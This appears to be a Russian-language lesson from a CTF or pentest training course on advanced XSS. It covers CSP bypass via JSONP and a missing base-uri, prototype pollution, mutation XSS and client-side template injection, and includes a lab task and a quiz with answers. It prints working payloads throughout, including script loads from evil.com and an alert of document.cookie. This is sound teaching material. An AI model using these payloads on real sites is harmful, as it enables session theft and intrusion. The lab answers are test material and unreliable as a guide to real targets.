---
id: web-xss-bypass-advanced
title: "XSS: обход защит и продвинутые векторы"
category: web
parent: web-xss
difficulty: easy
order: 2
tags: [csp, mutation, prototype, roadmap]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 8
summary: "Продвинутый уровень XSS: обход CSP, prototype pollution, mXSS и CSTI."
lab:
  kind: shell
  title: "Практика: обход CSP через разрешённый JSONP"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Сначала посмотри CSP: `curl -sI https://shop.local/ | grep -i content-security-policy`."
    - "`script-src` разрешает `cdn.shop.local` — это доверенный домен."
    - "На CDN есть JSONP-эндпоинт, отражающий `callback` в ответ без экранирования."
    - "Приватный эндпоинт того же CDN отдаёт секрет с отражённым callback. Запиши в `found.txt` и `check`."
---

## Задача

Когда базовый XSS закрыт санитайзером и **CSP** (Content Security Policy — политика, запрещающая исполнять чужой скрипт), в дело идут продвинутые векторы: обход CSP через доверенные домены, prototype pollution, mXSS и клиентский шаблонный XSS.

Разберём сайт с CSP и санитайзером.

## Наш пример: CSP и санитайзер

Смотрим заголовок политики:

```bash
$ curl -sI https://shop.local/ | grep -i content-security-policy
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.shop.local
```

`script-src` разрешает скрипты только со своего домена и `cdn.shop.local`. Прямой `<script>alert(1)</script>` не выполнится. Ищем обход.

## Шаг 1: обход CSP через доверенный домен (JSONP)

Если среди разрешённых доменов есть эндпоинт, отдающий данные как JS (JSONP), его можно использовать как «легальный» скрипт:

```bash
$ curl -s 'https://cdn.shop.local/api/user?callback=alert'
alert({"user":"alice"});
```

Тогда подключаем его в страницу:

```html
<script src="https://cdn.shop.local/api/user?callback=alert(1)//"></script>
```

Браузер разрешит загрузку (домен доверенный), а `alert(1)` выполнится. Это **CSP bypass через JSONP**: политика соблюдена, а код исполнен.

## Шаг 2: обход через `strict-dynamic` и базы

CSP бывают слабее, чем кажутся. Частые дыры:

- **`'unsafe-inline'`** — inline-скрипты разрешены; XSS тривиален.
- **`'unsafe-eval'`** — разрешён `eval`; гаджеты проходят.
- **Отсутствие `base-uri`** — подсунув `<base href="https://evil.com/">`, перепишем все относительные скрипты.
- **Отсутствие `object-src`** — флеш/`<object>`-гаджеты.
- **`'nonce-...'` переиспользуется** — если nonce статичен, скрипт с ним пройдёт.

```bash
$ curl -sI https://shop.local/ | grep -i 'base-uri\|object-src'
# пусто -> base-uri не задан
```

```html
<base href="https://evil.com/">
<script src="/app.js"></script>  <!-- грузится с evil.com -->
```

## Шаг 3: prototype pollution — загрязняем прототип

**Prototype pollution** — запись в `Object.prototype` через слияние объектов. Если клиентский код делает `merge(target, JSON.parse(input))` с ключом `__proto__`, мы меняем поведение всех объектов:

```bash
$ curl -s 'https://shop.local/settings' -H 'Content-Type: application/json' \
  -d '{"__proto__":{"src":"https://evil.com/x.js"}}'
```

Дальше уязвимый код может сам вставить скрипт:

```javascript
let s = document.createElement('script');
s.src = config.src;          // config.src унаследован от Object.prototype
document.body.appendChild(s);
```

Так prototype pollution превращается в XSS. На сервере он может дать RCE.

## Шаг 4: mXSS — мутация разметки

**mXSS** (mutation XSS) — payload, который выглядит безопасным до того, как браузер его «переварит». Санитайзер видит одно, а после нормализации DOM получается другое:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Внутри `<noscript>` парсер читает разметку иначе; после мутации `onerror` оказывается активным. Санитайзер пропустил, браузер исполнил.

## Шаг 5: CSTI — клиентский шаблонный XSS

Если клиент использует шаблонизатор (Angular, Vue) и подставляет ввод в шаблон, получается **CSTI** (client-side template injection):

```html
{{constructor.constructor('alert(1)')()}}
```

Angular выполнит выражение. Проверка: подставь `{{7*7}}` — если в DOM появилось `49`, шаблон исполняется на клиенте.

## Шаг 6: как искать продвинутый XSS

- **CSP:** читай политику; ищи JSONP, `unsafe-inline`, отсутствие `base-uri`/`object-src`.
- **Prototype:** ищи `merge`/`extend`/`Object.assign` с пользовательским JSON и ключ `__proto__`.
- **mXSS:** пробуй вложенные теги (`noscript`, `svg`, `math`), которые мутируют при парсинге.
- **CSTI:** подставь `{{7*7}}` в поля, которые рендерит Angular/Vue.
- **Инструменты:** CSP Evaluator, DOMPurify-bypass-списки.

## Если не сработало

- **CSP строгий, nonce случайный** — ищи DOM-XSS в разрешённом скрипте или JSONP.
- **Санитайзер устойчив** — ищи обход через `math`/`svg`-мутации или `iframe srcdoc`.
- **Prototype pollution не влияет** — проверь, использует ли код унаследованное свойство.
- **CSTI не исполняется** — проверь версию фреймворка (старые Angular уязвимы).

## Что мы теперь знаем

- CSP обходится через доверенный домен (JSONP) и слабые директивы (`base-uri`, `object-src`).
- Prototype pollution загрязняет `Object.prototype` и превращается в XSS.
- mXSS использует мутацию разметки: безопасно до парсинга, опасно после.
- CSTI — инъекция в клиентский шаблонизатор (`{{...}}`).

## Частые вопросы

**CSP — это надёжная защита от XSS?** Хорошая, но не абсолютная: она ломается на слабых директивах (`unsafe-inline`, отсутствие `base-uri`) и доверенных доменах с JSONP.

**Почему JSONP ломает CSP?** Потому что скрипт грузится с **разрешённого** домена — политика соблюдена, а код (callback) исполняется.

**Prototype pollution — это клиентский баг?** И клиентский, и серверный. На клиенте он ведёт к XSS, на сервере — к RCE (см. `web-prototype-pollution-rce`).

**mXSS не устарел?** Нет: санитайзеры и браузеры по-прежнему расходятся в парсинге, поэтому мутации находят регулярно.

**CSTI — это про Angular?** Про любой клиентский шаблонизатор (Angular, Vue). Проверка: подставь `{{7*7}}` — если появилось `49`, шаблон исполняется.

**С чего начать обход?** Прочитай CSP, найди доверенные домены и слабые директивы. Затем — JSONP или DOM-XSS в разрешённом скрипте.

## Ещё один сценарий: обход CSP через подмену base

Если в CSP нет `base-uri`, можно переписать все относительные скрипты на свой домен:

```bash
$ curl -sI https://shop.local/ | grep -i content-security-policy
Content-Security-Policy: default-src 'self'; script-src 'self'
$ curl -sI https://shop.local/ | grep -i base-uri
# пусто -> base-uri не задан
```

Вставляем `<base>` в разметку (если есть HTML-инъекция):

```html
<base href="https://evil.com/">
<script src="/app.js"></script>   <!-- грузится с evil.com -->
```

Браузер разрешает `script-src 'self'` — но «self» теперь `evil.com` после подмены базы. Это **CSP bypass через отсутствие `base-uri`**.

```bash
$ curl -s https://evil.com/app.js   # наш скрипт, исполняется на shop.local
alert(document.cookie)
```

## На что смотреть дальше

- **CSP-директивы.** `script-src`, `base-uri`, `object-src`, `unsafe-inline/eval`.
- **Доверенные домены.** JSONP, CDN с пользовательским контентом.
- **Nonce/hash.** Меняется ли nonce; можно ли подсунуть свой скрипт.
- **Prototype pollution.** Слияние с `__proto__` → подмена свойств.
- **mXSS.** `noscript`, `svg`, `math` — мутация разметки.
- **CSTI.** `{{7*7}}` в Angular/Vue — рендер на клиенте.

## Квиз

Проверь себя.

```quiz
- question: "Как обойти CSP через JSONP?"
  options:
    - "Подключить скрипт с доверенного домена, отдающий данные как JS"
    - "Отключить HTTPS"
    - "Прочитать /etc/passwd"
    - "Подделать JWT"
  answer: 0
  explanation: "Разрешённый домен отдаёт callback-вызов, который исполняется как скрипт."
- question: "Зачем нужна директива base-uri в CSP?"
  options:
    - "Чтобы запретить подмену <base> и загрузку скриптов с чужого домена"
    - "Чтобы ускорить сайт"
    - "Чтобы шифровать cookie"
    - "Чтобы логировать запросы"
  answer: 0
  explanation: "Без base-uri можно переписать относительные скрипты на evil.com."
- question: "Что такое prototype pollution?"
  options:
    - "Запись в Object.prototype через слияние объектов (ключ __proto__)"
    - "Инъекция SQL"
    - "Чтение файла"
    - "Подмена cookie"
  answer: 0
  explanation: "Загрязняя прототип, меняют поведение всех объектов — вплоть до XSS/RCE."
- question: "Чем опасен mXSS?"
  options:
    - "Payload безопасен до парсинга, но становится активным после мутации DOM"
    - "Он шифрует разметку"
    - "Он ускоряет рендер"
    - "Он удаляет cookie"
  answer: 0
  explanation: "Санитайзер и браузер по-разному разбирают разметку — payload мутирует в активный."
```

## Куда дальше

На этом ветвь XSS завершена, а с ней — весь базовый маршрут по веб-уязвимостям. Дальше — углублённые темы: request smuggling, deserialization-цепочки, cloud SSRF. А пока главное запомни: **XSS обходит защиту не силой payload, а слабостями CSP, санитайзера и прототипа.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
